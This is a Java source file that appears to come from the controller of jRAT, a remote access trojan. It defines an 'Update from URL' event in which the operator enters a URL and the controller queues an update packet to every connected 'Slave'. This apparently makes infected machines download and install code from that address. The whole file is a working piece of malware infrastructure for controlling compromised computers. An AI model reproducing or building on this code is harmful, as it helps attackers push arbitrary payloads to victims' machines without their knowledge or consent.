package se.jrat.controller.events;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet18Update;
import se.jrat.controller.utils.IconUtils;
import se.jrat.controller.utils.NetUtils;
import se.jrat.controller.utils.Utils;


public class UpdateFromURLEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String url;

	public UpdateFromURLEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url };
	}

	@Override
	public void perform(AbstractSlave sl) {
		if (sl instanceof Slave) {
			((Slave)sl).addToSendQueue(new Packet18Update(url));
		}
	}

	@Override
	public String toString() {
		return "Update from URL";
	}

	@Override
	public boolean add() {
		String result = Utils.showDialog("Update from URL", "Input URL to update with");
		if (result == null) {
			return false;
		}
		if (!NetUtils.isURL(result)) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		url = result.trim().replace(" ", "%20");
		return true;
	}

	@Override
	public String getIcon() {
		return "update";
	}

}
